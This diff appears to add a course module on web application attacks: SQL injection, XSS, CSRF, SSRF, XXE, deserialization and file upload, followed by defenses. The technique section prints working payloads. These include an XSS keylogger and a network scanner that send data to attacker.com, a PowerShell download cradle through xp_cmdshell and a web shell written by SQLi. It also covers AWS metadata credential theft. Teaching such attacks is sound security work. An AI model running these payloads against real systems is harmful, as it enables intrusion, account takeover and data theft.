@@ -1,0 +1,782 @@
+  'web-app-attacks': {
+    concept: `
+<h2>Web Application Attacks: Vulnerabilities, Mechanics, and Exploitation Chains</h2>
+
+<h3>Why Web Applications Are the Primary Attack Surface</h3>
+<p>
+  Web applications represent the largest and most consistently exploited attack surface in
+  modern organizations. They are internet-facing by design, continuously developed under
+  competitive time pressure, built by teams whose primary incentive is feature velocity, and
+  they handle the most sensitive data an organization possesses: customer records, payment
+  information, authentication credentials, and internal business logic. The OWASP Top 10 is
+  not a theoretical list — it is a ranked catalog of vulnerabilities found in real breaches,
+  updated every few years based on data from thousands of organizations. Every major data
+  breach of the last decade involved at least one OWASP Top 10 category.
+</p>
+
+<h3>SQL Injection: History, Mechanics, and Full Taxonomy</h3>
+
+<h4>How Relational Databases Work and Why Concatenation Is Dangerous</h4>
+<p>
+  Modern web applications store data in relational database management systems (RDBMS): MySQL,
+  Microsoft SQL Server (MSSQL), PostgreSQL, Oracle, SQLite. These databases organize data into
+  tables (rows and columns) and expose SQL (Structured Query Language) for creating, reading,
+  updating, and deleting records. A typical login query:
+</p>
+<pre><code>-- Intended query for user 'alice' with password 'hunter2':
+SELECT id, username, role FROM users
+WHERE username = 'alice'
+AND password_hash = 'sha256_of_hunter2'
+
+-- If exactly one row is returned, login succeeds.
+-- If zero rows, credentials are wrong.</code></pre>
+<p>
+  The fatal flaw introduced in the 1990s was string concatenation: developers built SQL strings
+  by directly inserting user-supplied values into query text. When the username is controlled
+  by the attacker, the attacker controls part of the SQL statement itself.
+  <em>User input becomes code.</em>
+</p>
+<pre><code># Vulnerable Python code (string concatenation):
+query = "SELECT id, username, role FROM users WHERE username = '" + username + "'"
+
+# Normal input (username = alice):
+SELECT id, username, role FROM users WHERE username = 'alice'
+
+# Injected input (username = admin'--):
+SELECT id, username, role FROM users WHERE username = 'admin'--'
+# Everything after -- is a SQL comment and is ignored.
+# Password check disappears. Any user logs in as 'admin' with any password.
+
+# OR bypass (username = ' OR '1'='1'--):
+SELECT id, username, role FROM users WHERE username = '' OR '1'='1'--'
+# '1'='1' is always true — returns ALL users
+# Attacker logs in as the first user in the database (often admin)</code></pre>
+
+<h4>The Full SQLi Taxonomy</h4>
+<p>
+  SQL injection is a family of techniques differentiated by how the attacker receives feedback:
+</p>
+<p>
+  <strong>In-band Error-Based:</strong> The application includes database error messages in
+  the HTTP response. The attacker deliberately triggers errors to extract schema information.
+  In MySQL, <code>extractvalue(1, concat(0x7e, (SELECT version())))</code> triggers an XPath
+  error containing the database version string.
+</p>
+<p>
+  <strong>In-band Union-Based:</strong> The attacker appends an additional SELECT statement
+  using the UNION operator. If column count and data types match, the attacker's query results
+  appear alongside legitimate results in the page:
+</p>
+<pre><code># Original: SELECT name, price FROM products WHERE category='Electronics'
+# Injected: category = Electronics' UNION SELECT username, password FROM users--
+
+# The page now displays product names AND usernames/hashes from the users table.
+# The browser renders them identically in the product listing HTML.</code></pre>
+<p>
+  <strong>Blind Boolean-Based:</strong> No data appears in the response, but the page renders
+  differently based on whether a condition is true or false. The attacker infers data
+  one character at a time:
+</p>
+<pre><code># Does the database version start with '8'?
+# True payload:  ' AND SUBSTRING(VERSION(),1,1)='8'--  page loads normally
+# False payload: ' AND SUBSTRING(VERSION(),1,1)='5'--  page changes
+# Inference: version starts with '8' — MySQL 8.x
+# Binary search requires approx 7 requests per character
+# Extracting a 20-character password requires approx 140 requests — automated with sqlmap</code></pre>
+<p>
+  <strong>Blind Time-Based:</strong> No behavioral difference in the response, but the attacker
+  observes response timing. A deliberate sleep confirms injection even when the page looks
+  completely identical:
+</p>
+<pre><code>MySQL:     ' AND SLEEP(5)--              5-second delay confirms injection
+MSSQL:     '; WAITFOR DELAY '0:0:5'--   5-second delay
+PostgreSQL: '; SELECT pg_sleep(5)--      5-second delay
+Oracle:    ' AND 1=dbms_pipe.receive_message(('a'),5)--</code></pre>
+<p>
+  <strong>Out-of-Band DNS Exfiltration:</strong> When the database server has outbound network
+  access, data is exfiltrated through DNS lookups. Oracle's <code>UTL_HTTP</code> package and
+  MySQL's <code>LOAD_FILE</code> with a UNC path cause the database to make outbound DNS and
+  HTTP requests to attacker-controlled infrastructure, exfiltrating data in subdomains.
+</p>
+<p>
+  <strong>Second-Order SQLi:</strong> The payload is stored in the database without immediate
+  execution, then later retrieved and incorporated into a second SQL query in a different code
+  path that uses string concatenation. For example, a username <code>admin'--</code> stored
+  safely at registration time triggers injection when a password-change function retrieves it
+  and builds a query via concatenation. Second-order SQLi defeats input sanitization applied
+  only at the entry point.
+</p>
+
+<h3>Cross-Site Scripting (XSS): The DOM, Trust, and Execution Context</h3>
+
+<h4>Why Browsers Trust Scripts on a Page</h4>
+<p>
+  The browser's security model is built around the Same-Origin Policy (SOP): scripts loaded
+  from <code>https://example.com</code> can access cookies, localStorage, and the DOM of pages
+  from <code>https://example.com</code>, but not from other origins. The SOP assumes that any
+  script running in the context of a website was intentionally placed there by the site's
+  developers. XSS violates this assumption by injecting attacker-controlled script into the
+  site's context. Once the browser executes that script, it has full access to everything the
+  legitimate site's JavaScript can access — cookies (unless HttpOnly), localStorage, session
+  data, the full DOM, and the ability to make authenticated HTTP requests to the server.
+</p>
+
+<h4>Reflected vs. Stored vs. DOM-Based XSS</h4>
+<p>
+  <strong>Reflected XSS:</strong> The malicious script is embedded in a URL parameter that
+  the server echoes back into the page without encoding. The attacker sends the crafted URL
+  to a victim via email or social media. When the victim clicks, their browser executes the
+  script in the site's context:
+</p>
+<pre><code># Vulnerable search endpoint (PHP):
+echo "Search results for: " . $_GET['q'];
+
+# Attacker crafts URL:
+/search?q=&lt;script&gt;fetch('https://attacker.com/steal?c='+document.cookie)&lt;/script&gt;
+
+# Victim clicks link: cookie sent to attacker.com; attacker hijacks session</code></pre>
+<p>
+  <strong>Stored (Persistent) XSS:</strong> The payload is saved in the database and served
+  to every user who views the affected content — forum posts, product reviews, chat messages,
+  profile fields. This is the highest-impact variant: a single injection can execute against
+  thousands or millions of users. The 2005 MySpace Samy worm used stored XSS to spread to
+  one million users in under 24 hours.
+</p>
+<p>
+  <strong>DOM-Based XSS:</strong> The vulnerability exists entirely in client-side JavaScript.
+  The server sends a clean HTML page, but the page's JavaScript reads from an
+  attacker-controlled source (URL hash, document.referrer, postMessage) and writes it to the
+  DOM without encoding. The server never sees the malicious payload — only the victim's browser
+  processes it. Server-side WAFs cannot detect DOM-based XSS at the server layer.
+</p>
+
+<h4>XSS Beyond Cookie Theft</h4>
+<ul>
+  <li><strong>Keylogger injection:</strong> JavaScript event listeners capture every keystroke
+  typed on the domain — including passwords — and exfiltrate them in real time to the attacker's
+  server via background XHR requests.</li>
+  <li><strong>BeEF (Browser Exploitation Framework) hooking:</strong> XSS injects the BeEF
+  hook script, turning the victim's browser into a remotely controlled agent. The attacker's
+  dashboard can launch browser-specific exploits, port scan internal networks from the victim's
+  browser, conduct phishing overlays, and pivot through the victim's authenticated sessions.</li>
+  <li><strong>Internal network scanning:</strong> JavaScript in the victim's browser can make
+  XMLHttpRequests to internal IP addresses, effectively scanning the internal network from
+  inside the corporate perimeter — bypassing all perimeter firewall controls. Response timing
+  reveals which ports are open.</li>
+  <li><strong>CSRF token bypass:</strong> If the XSS is stored on the same page containing
+  a CSRF token, the injected script reads the token directly and performs authenticated
+  state-changing operations on behalf of the victim — without any credential theft.</li>
+  <li><strong>Admin panel compromise:</strong> Stored XSS that executes when an administrator
+  views the infected content inherits admin privileges in the admin's browser session,
+  enabling account creation, configuration changes, and data exfiltration.</li>
+</ul>
+
+<h4>Content Security Policy: Defense and Bypass</h4>
+<pre><code># Strict nonce-based CSP:
+Content-Security-Policy: default-src 'self'; script-src 'nonce-r4nd0m123'
+# Only scripts with the matching nonce attribute will execute.
+# The attacker cannot know the nonce (generated fresh per request server-side).
+
+# CSP bypass: unsafe-inline present
+Content-Security-Policy: script-src 'self' 'unsafe-inline'
+# 'unsafe-inline' allows all inline scripts — XSS works normally
+# The CSP header exists but provides zero XSS protection
+
+# CSP bypass: JSONP endpoint on allowlisted domain
+Content-Security-Policy: script-src 'self' https://trusted-cdn.com
+# If trusted-cdn.com hosts a JSONP endpoint:
+# https://trusted-cdn.com/api/callback?callback=alert(1)
+# This script comes from an allowlisted domain — CSP does not block it</code></pre>
+
+<h3>Cross-Site Request Forgery (CSRF): The Browser Cookie Trust Model</h3>
+<p>
+  Browsers automatically include cookies with every request to the matching domain, regardless
+  of where the request originated. This is the fundamental behavior enabling persistent
+  sessions — and what makes CSRF possible. When a logged-in user visits attacker.com, the
+  attacker's page causes the user's browser to make a request to bank.com, and the browser
+  automatically attaches the user's bank.com session cookie. The bank cannot distinguish this
+  request from one the user initiated intentionally.
+</p>
+<pre><code>&lt;!-- On attacker.com — hidden form auto-submits on page load: --&gt;
+&lt;form action="https://bank.com/transfer" method="POST" id="csrf"&gt;
+  &lt;input type="hidden" name="to_account" value="attacker_account_number"&gt;
+  &lt;input type="hidden" name="amount" value="9999"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('csrf').submit();&lt;/script&gt;
+
+&lt;!-- Victim visits attacker.com while logged into bank.com --&gt;
+&lt;!-- Browser sends POST to bank.com with victim's session cookie attached --&gt;
+&lt;!-- Bank sees an authenticated transfer request and processes it --&gt;</code></pre>
+<p>
+  Modern defenses include CSRF tokens (a random value embedded in forms and verified
+  server-side), and the <code>SameSite</code> cookie attribute
+  (<code>SameSite=Strict</code> or <code>SameSite=Lax</code> prevents cross-site cookie
+  inclusion in most browsers). JSON CSRF is a variant where the target endpoint accepts JSON
+  — historically browsers could not send <code>Content-Type: application/json</code> in
+  cross-origin requests without a CORS preflight, but some APIs accepted both form-encoded
+  and JSON bodies, enabling CSRF via form submission.
+</p>
+
+<h3>Server-Side Request Forgery (SSRF)</h3>
+<p>
+  SSRF occurs when an application fetches a remote resource based on a URL supplied by the
+  user, without adequate validation. The attacker makes the server perform requests on their
+  behalf — reaching services the attacker cannot access directly. The most critical SSRF
+  targets in cloud environments are the cloud provider Instance Metadata Services:
+</p>
+<pre><code># AWS IMDSv1 (no authentication required for EC2 instances):
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# Returns the name of the IAM role attached to the EC2 instance
+
+http://169.254.169.254/latest/meta-data/iam/security-credentials/WebServerRole
+# Returns temporary AWS credentials:
+# AccessKeyId, SecretAccessKey, Token, Expiration
+
+# GCP Metadata: http://metadata.google.internal/computeMetadata/v1/
+# Azure:        http://169.254.169.254/metadata/instance?api-version=2021-01-01</code></pre>
+<p>
+  SSRF filter bypass: IP addresses can be encoded in multiple formats that all resolve to the
+  same host but evade string-matching filters. Decimal encoding of 169.254.169.254 is
+  2852039166. Hex: 0xa9fea9fe. Octal: 025177524776. IPv6: [::ffff:169.254.169.254].
+  DNS rebinding: a domain initially resolves to an allowed IP, but between the validation
+  check and the actual fetch, the DNS TTL expires and the record changes to 169.254.169.254.
+</p>
+
+<h3>XML External Entity Injection (XXE)</h3>
+<p>
+  XML parsers support external entities: references to resources outside the XML document,
+  fetched and included during parsing. When an application parses attacker-supplied XML with
+  an insecure parser, the attacker defines an external entity pointing to a local file or URL:
+</p>
+<pre><code>&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+
+# The XML parser reads /etc/passwd and includes its contents as the value of &amp;xxe;
+# If the application returns the parsed value, the attacker reads arbitrary files.
+
+# XXE for SSRF (fetch internal metadata):
+&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;
+
+# Blind XXE via DNS (out-of-band exfiltration):
+&lt;!ENTITY xxe SYSTEM "http://attacker.com/?data=sensitive_value"&gt;
+# Parser makes HTTP request to attacker.com, exfiltrating data in the URL parameter</code></pre>
+
+<h3>Insecure Deserialization</h3>
+<p>
+  Serialization converts an in-memory object to a byte stream for storage or transmission.
+  Deserialization reconstructs the object from that byte stream. The critical vulnerability
+  arises because many serialization formats invoke class methods during deserialization —
+  before the application validates the object's contents. An attacker who can supply a
+  crafted serialized payload exploits "gadget chains": sequences of existing classes in the
+  application's classpath whose methods, when called during deserialization, execute arbitrary
+  code.
+</p>
+<pre><code># Java deserialization (ysoserial tool generates gadget chain payloads):
+java -jar ysoserial.jar CommonsCollections1 "wget http://attacker.com/shell.php -O /var/www/html/shell.php"
+# Generated payload sent in serialized Java object field (cookie or POST body)
+# Server deserializes it: gadget chain executes: wget runs: shell planted
+
+# Python pickle deserialization:
+# pickle.loads() calls __reduce__ during deserialization
+# An attacker-controlled pickle payload executes arbitrary Python code during loads()
+
+# PHP unserialize():
+# PHP calls __wakeup() and __destruct() magic methods during unserialization
+# Gadget chains in popular frameworks (Laravel, Magento, Drupal) enable RCE</code></pre>
+
+<h3>Insecure Direct Object Reference (IDOR)</h3>
+<p>
+  IDOR occurs when an application uses user-controlled identifiers (IDs, filenames, account
+  numbers) to access objects directly, without verifying that the authenticated user is
+  authorized to access that specific object. The vulnerability is entirely in missing
+  authorization logic, not injection or encoding. An attacker changes
+  <code>/api/invoices/1234</code> to <code>/api/invoices/1235</code> and retrieves another
+  user's invoice. IDOR enables horizontal privilege escalation (accessing other users' data
+  at the same privilege level) and vertical privilege escalation (accessing admin functions
+  by guessing admin-level object IDs).
+</p>
+
+<h3>File Upload Vulnerabilities: Complete Bypass Taxonomy</h3>
+<p>
+  Any file upload feature is a potential code execution vector if the server can be tricked
+  into storing and executing attacker-supplied code:
+</p>
+<ul>
+  <li><strong>Extension blacklist bypass:</strong> Server blocks <code>.php</code> but allows
+  <code>.php5</code>, <code>.phtml</code>, <code>.phar</code>, <code>.php.jpg</code></li>
+  <li><strong>MIME type spoofing:</strong> Content-Type header is sent by the client and
+  trivially set to <code>image/jpeg</code> regardless of actual file contents</li>
+  <li><strong>Magic byte manipulation:</strong> Prepend GIF, JPEG, or PNG magic bytes before
+  PHP code to pass magic-byte-based image validators</li>
+  <li><strong>Double extension:</strong> <code>shell.jpg.php</code> — some servers parse the
+  last extension, some parse the first</li>
+  <li><strong>Null byte injection (legacy PHP):</strong> <code>shell.php%00.jpg</code> — the
+  null byte terminates the string at the filesystem level, writing <code>shell.php</code></li>
+  <li><strong>Path traversal in filename:</strong> <code>../../var/www/html/shell.php</code>
+  in the filename field — if the server uses the user-supplied filename without sanitization</li>
+</ul>
+`,
+    technique: `
+<h2>Web Application Attack Techniques: Step-by-Step Exploitation Workflows</h2>
+
+<h3>Full SQLi Exploitation Workflow</h3>
+
+<h4>Step 1: Detection</h4>
+<pre><code># Test for error-based injection — add single quote to parameter:
+https://target.com/products?id=1'
+# If response contains: "You have an error in your SQL syntax"
+# Database error leaked — SQLi confirmed, MySQL likely
+
+# Test boolean behavior difference:
+https://target.com/products?id=1 AND 1=1   same response as normal
+https://target.com/products?id=1 AND 1=2   different or empty response
+# Boolean-based blind SQLi confirmed
+
+# Test time-based blind:
+https://target.com/products?id=1; SELECT SLEEP(5)--
+# If response takes 5 seconds longer: time-based SQLi confirmed</code></pre>
+
+<h4>Step 2: Database Fingerprinting</h4>
+<pre><code># Comment style reveals database type:
+' AND 1=1--           MySQL, MSSQL, PostgreSQL
+' AND 1=1/*           MySQL
+' AND 1=1 AND '1'='1  Oracle (no inline comment needed)
+
+# Version extraction per database:
+' UNION SELECT @@version,null--                MySQL, MSSQL
+' UNION SELECT version(),null--                PostgreSQL
+' UNION SELECT banner,null FROM v$version--    Oracle</code></pre>
+
+<h4>Step 3: Schema Enumeration</h4>
+<pre><code># MySQL / PostgreSQL / MSSQL: use information_schema
+' UNION SELECT table_name,null FROM information_schema.tables
+  WHERE table_schema=database()--
+
+# Output: users, products, orders, sessions, admin_accounts
+
+# Column names from target table:
+' UNION SELECT column_name,null FROM information_schema.columns
+  WHERE table_name='users'--
+
+# Output: id, username, password, email, role, created_at
+
+# Oracle uses ALL_TABLES and ALL_COLUMNS instead of information_schema</code></pre>
+
+<h4>Step 4: Data Extraction</h4>
+<pre><code># UNION-based (results visible in page):
+' UNION SELECT username,password FROM users--
+# Returns usernames and password hashes in page output
+
+# Substring-based blind extraction (one character at a time):
+' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
+# True/false response reveals each character
+
+# Concatenate multiple columns into one (when only one column is injectable):
+' UNION SELECT concat(username,':',password),null FROM users--</code></pre>
+
+<h4>Step 5: OS-Level Access via SQLi</h4>
+<pre><code># MySQL FILE privilege — read arbitrary files:
+' UNION SELECT LOAD_FILE('/etc/passwd'),null--
+
+# MySQL FILE privilege — write web shell to webroot:
+' UNION SELECT '&lt;?php system($_GET[cmd]);?&gt;',null
+  INTO OUTFILE '/var/www/html/shell.php'--
+
+# MSSQL xp_cmdshell — OS command execution directly from SQL:
+'; EXEC xp_cmdshell('whoami')--
+# If xp_cmdshell is disabled (default since SQL Server 2005):
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+   EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--
+'; EXEC xp_cmdshell('powershell -WindowStyle Hidden -c IEX(New-Object Net.WebClient).DownloadString(''http://c2.com/shell.ps1'')')--</code></pre>
+
+<h4>Step 6: sqlmap Automation</h4>
+<pre><code># Basic detection and database enumeration:
+sqlmap -u "https://target.com/products?id=1" --dbs
+
+# Dump a specific table:
+sqlmap -u "https://target.com/products?id=1" -D acmedb -T users --dump --risk=3 --level=5
+
+# For POST login forms:
+sqlmap -u "https://target.com/login" --data="user=admin&pass=test" -p user --dbs
+
+# WAF bypass using tamper scripts:
+sqlmap -u "https://target.com/?id=1" --tamper=space2comment,charencode,randomcase --dbs
+# space2comment: replaces spaces with /**/
+# charencode:    URL-encodes payload characters
+# randomcase:    randomizes character case (SELECT becomes SeLeCt)
+
+# Request OS shell via MSSQL xp_cmdshell:
+sqlmap -u "https://target.com/?id=1" --os-shell --dbms=mssql</code></pre>
+
+<h3>XSS Attack Chain: Keylogger and Internal Network Scan</h3>
+<pre><code># XSS keylogger payload (injected via stored XSS in a comment field):
+&lt;script&gt;
+document.addEventListener('keydown', function(e) {
+  if (!window._keyBuffer) window._keyBuffer = '';
+  window._keyBuffer += e.key;
+  if (window._keyBuffer.length &gt; 50) {
+    new Image().src = 'https://attacker.com/log?k=' + btoa(window._keyBuffer);
+    window._keyBuffer = '';
+  }
+});
+&lt;/script&gt;
+# Every 50 keystrokes are base64-encoded and sent to attacker's server.
+# Captures passwords typed into any form on the domain after page load.
+
+# XSS internal network scan (from victim's browser, behind the firewall):
+&lt;script&gt;
+['192.168.1.1','10.0.0.1','10.0.0.100','172.16.0.1'].forEach(function(ip) {
+  var start = Date.now();
+  var img = new Image();
+  img.onerror = function() {
+    var elapsed = Date.now() - start;
+    if (elapsed &lt; 1000) {
+      new Image().src = 'https://attacker.com/scan?ip=' + ip + '&open=true';
+    }
+  };
+  img.src = 'http://' + ip + '/';
+});
+&lt;/script&gt;
+# Victim's browser scans internal network from inside the perimeter.
+# Response timing reveals which internal IPs have web services running.</code></pre>
+
+<h3>SSRF to AWS Credential Theft: Complete Chain</h3>
+<pre><code># Step 1: Find SSRF vulnerability in image fetcher or URL preview
+POST /api/preview
+{"url": "https://example.com/image.jpg"}
+# Application fetches the URL and returns a preview
+
+# Step 2: Target AWS IMDSv1 (no authentication required)
+POST /api/preview
+{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
+# Response: WebServerRole
+
+# Step 3: Retrieve credentials for that role
+POST /api/preview
+{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/WebServerRole"}
+# Response:
+# {
+#   "AccessKeyId": "ASIAXXXXXXXXXXXXXXXXXXX",
+#   "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+#   "Token": "AQoDYXdzEJr...",
+#   "Expiration": "2026-03-07T22:00:00Z"
+# }
+
+# Step 4: Configure AWS CLI with stolen credentials
+export AWS_ACCESS_KEY_ID=ASIAXXXXXXXXXXXXXXXXXXX
+export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+export AWS_SESSION_TOKEN=AQoDYXdzEJr...
+
+# Step 5: Enumerate what this role can access
+aws sts get-caller-identity          # Confirm stolen identity
+aws s3 ls                            # List all S3 buckets
+aws secretsmanager list-secrets      # List secrets manager entries
+aws ec2 describe-instances           # List EC2 instances</code></pre>
+
+<h3>Burp Suite Professional Workflow</h3>
+<pre><code># 1. Proxy intercept:
+# Configure browser: HTTP proxy 127.0.0.1:8080
+# Burp captures all HTTP/HTTPS traffic in Proxy tab
+# Toggle "Intercept is on" to pause and modify each request
+
+# 2. Repeater for manual testing:
+# Right-click any request: Send to Repeater
+# Modify parameters and re-send without browser involvement
+# Test: id=1  id=1'  id=1 AND 1=1  id=1 UNION SELECT null--
+
+# 3. Intruder for automated fuzzing:
+# Send to Intruder. In Positions tab, mark injection points with markers.
+# Four attack types:
+#   Sniper:       one payload set, one position at a time
+#   Battering Ram: one payload set, same payload in all positions simultaneously
+#   Pitchfork:    multiple payload sets, iterated in parallel (one per position)
+#   Cluster Bomb: multiple payload sets, tests ALL combinations (credential brute-force)
+
+# 4. Intruder payload sets:
+# Built-in: SQL injection, XSS, directory traversal, fuzzing
+# Custom lists from SecLists: /usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt
+# Results: sort by response length or status to find anomalous responses
+
+# 5. Scanner (Burp Pro) for automated discovery:
+# Right-click request: Actively scan this request
+# Results in Dashboard tab: Issues panel with severity and confidence ratings
+
+# 6. Collaborator for blind vulnerability detection:
+# Burp generates a unique burpcollaborator.net subdomain
+# Embed in XXE, SSRF, blind XSS payloads
+# If the server makes a DNS or HTTP request to that subdomain, Burp records it
+# Confirms blind injection even with zero visible response change</code></pre>
+
+<h3>Real-World Case Studies</h3>
+
+<h4>Equifax 2017: Apache Struts RCE (CVE-2017-5638)</h4>
+<p>
+  The Equifax breach exposed 147 million Americans' credit records. The vulnerability was in
+  Apache Struts 2's file upload handling — the Content-Type HTTP header was passed to the
+  OGNL expression evaluator without sanitization. An attacker sending a crafted Content-Type
+  header achieved remote code execution with the web server's privileges. Equifax was notified
+  of the vulnerability in March 2017 and failed to patch before exploitation began in May 2017.
+  The patch had been available for weeks before the breach.
+</p>
+
+<h4>Log4Shell 2021: JNDI Injection (CVE-2021-44228)</h4>
+<p>
+  Log4j, a ubiquitous Java logging library, evaluated JNDI (Java Naming and Directory Interface)
+  lookup strings found in logged messages. Any user-controlled string that ended up in a log
+  message could trigger a JNDI lookup: a User-Agent header containing the JNDI lookup syntax
+  caused the logging library to make an outbound LDAP request to the attacker's server, which
+  responded with a Java class file that Log4j loaded and executed. The vulnerability affected
+  virtually every Java application using Log4j 2.x — estimated at hundreds of millions of
+  deployments. The attack surface included any input that was logged: usernames, search terms,
+  HTTP headers, API request bodies.
+</p>
+
+<h4>Capital One 2019: SSRF to Cloud Metadata</h4>
+<p>
+  A misconfigured AWS WAF's EC2 instance was vulnerable to SSRF. An attacker (a former AWS
+  employee) used this to retrieve temporary IAM credentials from the instance metadata service,
+  then used those credentials to access over 100 million customer records in S3 and DynamoDB.
+  The IAM role had significantly more permissions than were necessary for the WAF to function
+  — a direct violation of the principle of least privilege. AWS IMDSv2 (requiring a PUT request
+  before GET) was not enforced. The $80 million fine and reputational damage were preventable
+  with two controls: least-privilege IAM roles and IMDSv2 enforcement.
+</p>
+`,
+    defense: `
+<h2>Defending Web Applications: Parameterized Queries, Encoding, CSP, and Architecture</h2>
+
+<h3>SQL Injection Prevention: Parameterized Queries Across All Languages</h3>
+<p>
+  The only reliable SQLi prevention is <strong>parameterized queries</strong> (prepared
+  statements). The query structure is sent to the database separately from the data values.
+  The database driver ensures user-supplied values are always treated as data, never as SQL
+  syntax — regardless of what characters they contain.
+</p>
+<pre><code># Python with psycopg2 (PostgreSQL):
+# WRONG (vulnerable):
+cursor.execute("SELECT * FROM users WHERE username = '" + username + "'")
+
+# CORRECT (parameterized):
+cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
+
+# Python with mysql-connector or sqlite3:
+cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
+
+# Java with PreparedStatement:
+String sql = "SELECT * FROM users WHERE username = ?";
+PreparedStatement stmt = conn.prepareStatement(sql);
+stmt.setString(1, username);
+ResultSet rs = stmt.executeQuery();
+
+# Node.js with pg (PostgreSQL):
+const { rows } = await pool.query(
+  'SELECT * FROM users WHERE username = $1',
+  [username]
+);
+
+# Node.js with mysql2:
+const [rows] = await conn.execute(
+  'SELECT * FROM users WHERE id = ?',
+  [userId]
+);
+
+# PHP with PDO:
+$stmt = $pdo-&gt;prepare('SELECT * FROM users WHERE username = :name');
+$stmt-&gt;execute([':name' =&gt; $username]);
+
+# Go with database/sql:
+rows, err := db.Query("SELECT * FROM users WHERE username = $1", username)</code></pre>
+
+<h3>Input Validation Philosophy</h3>
+<p>
+  Input validation is defense-in-depth, not a replacement for parameterized queries. The
+  correct philosophy is <strong>whitelist validation</strong>: define exactly what valid input
+  looks like and reject anything that does not match, rather than attempting to blacklist known
+  dangerous patterns. Blacklists fail because attackers find encodings and variations that bypass
+  them. Whitelists fail safely because unexpected input is rejected.
+</p>
+<pre><code># Whitelist examples:
+
+# Integer parameter: must be a positive integer
+if not isinstance(user_id, int) or user_id &lt; 1:
+    raise ValueError("Invalid user ID")
+
+# Email address: must match a strict pattern
+import re
+email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
+if not re.match(email_pattern, email):
+    raise ValueError("Invalid email format")
+
+# Filename: alphanumeric, dots, hyphens only (blocks path traversal)
+if not re.match(r'^[a-zA-Z0-9._-]+$', filename):
+    raise ValueError("Invalid filename")
+
+# Validate at EVERY trust boundary:
+#   At API endpoints receiving external input
+#   At internal service boundaries
+#   When reading from databases (defense against second-order injection)
+# Client-side JavaScript validation is UX only — never a security control</code></pre>
+
+<h3>Output Encoding: Context-Aware Rendering</h3>
+<p>
+  XSS prevention requires encoding output for the specific context where it appears. The same
+  user-supplied string requires different encoding in HTML body, HTML attributes, JavaScript,
+  URL parameters, and CSS. Using the wrong encoding for the context leaves XSS pathways open.
+</p>
+<pre><code># HTML context (body text):
+# WRONG: echo $username;
+# CORRECT: echo htmlspecialchars($username, ENT_QUOTES, 'UTF-8');
+# &lt; becomes &amp;lt;   &gt; becomes &amp;gt;   " becomes &amp;quot;   ' becomes &amp;#039;
+
+# JavaScript context (data injected into a JS variable):
+# WRONG: var user = "&lt;?php echo $username; ?&gt;";
+# CORRECT: use JSON encoding
+var user = &lt;?php echo json_encode($username); ?&gt;;
+
+# URL parameter context:
+# WRONG:  &lt;a href="/profile?user=&lt;?php echo $username; ?&gt;"&gt;
+# CORRECT: &lt;a href="/profile?user=&lt;?php echo urlencode($username); ?&gt;"&gt;
+
+# React (auto-escaping in JSX):
+// CORRECT — React auto-escapes:
+return &lt;div&gt;Welcome, {username}!&lt;/div&gt;;
+// WRONG — bypasses React's auto-escaping:
+return &lt;div dangerouslySetInnerHTML={{__html: username}}&gt;&lt;/div&gt;;
+
+# JavaScript libraries for safe output encoding:
+# DOMPurify: sanitizes HTML for safe innerHTML insertion
+element.innerHTML = DOMPurify.sanitize(userContent);
+# OWASP Java Encoder:
+String safe = Encode.forHtml(userInput);
+# Microsoft AntiXSS (.NET):
+string safe = Encoder.HtmlEncode(userInput);</code></pre>
+
+<h3>Content Security Policy: Building Effective Protection</h3>
+<pre><code># Start restrictive, relax only as needed:
+Content-Security-Policy: default-src 'self'
+# Blocks all external resources. Test here, then add specific allowances.
+
+# Nonce-based CSP (server generates random nonce per request):
+# Python/Flask:
+import secrets
+nonce = secrets.token_hex(16)
+response.headers['Content-Security-Policy'] = f"script-src 'nonce-{nonce}'"
+# In HTML template:
+# &lt;script nonce="{{ nonce }}"&gt;...&lt;/script&gt;
+# XSS injection cannot know the nonce — injected scripts are blocked
+
+# Hash-based CSP for fixed inline scripts:
+Content-Security-Policy: script-src 'sha256-abc123...'
+# Only the script with that exact SHA-256 hash will execute
+
+# Report-only mode for testing without enforcement:
+Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
+# Logs violations without blocking — use to test CSP before deploying
+
+# Complete production CSP example:
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' 'nonce-{server_nonce}';
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data: https://cdn.example.com;
+  connect-src 'self' https://api.example.com;
+  frame-ancestors 'none';
+  base-uri 'self';
+  form-action 'self'</code></pre>
+
+<h3>File Upload Security Checklist</h3>
+<pre><code># 1. Server-side MIME detection using libmagic (NOT the client Content-Type header):
+import magic
+file_type = magic.from_buffer(uploaded_file.read(1024), mime=True)
+allowed_types = {'image/jpeg', 'image/png', 'image/gif', 'application/pdf'}
+if file_type not in allowed_types:
+    raise ValueError(f"File type {file_type} not allowed")
+
+# 2. Rename server-side — never use the user-supplied filename:
+import secrets
+safe_name = secrets.token_hex(16) + '.jpg'  # Always a safe extension
+# The attacker's filename 'shell.php' is completely discarded
+
+# 3. Store uploads OUTSIDE the webroot:
+upload_dir = '/var/uploads/'  # Not /var/www/html/ — not web-accessible
+
+# 4. Serve through application controller (not direct URL):
+@app.route('/files/&lt;file_id&gt;')
+def serve_file(file_id):
+    path = get_upload_path(file_id)  # Returns /var/uploads/abc123.jpg
+    return send_file(path, mimetype='image/jpeg')
+
+# 5. Limit file size (prevent denial-of-service):
+MAX_SIZE = 5 * 1024 * 1024  # 5 MB
+if len(uploaded_file.read()) &gt; MAX_SIZE:
+    raise ValueError("File too large")
+
+# 6. Scan with antivirus for document/binary uploads:
+import subprocess
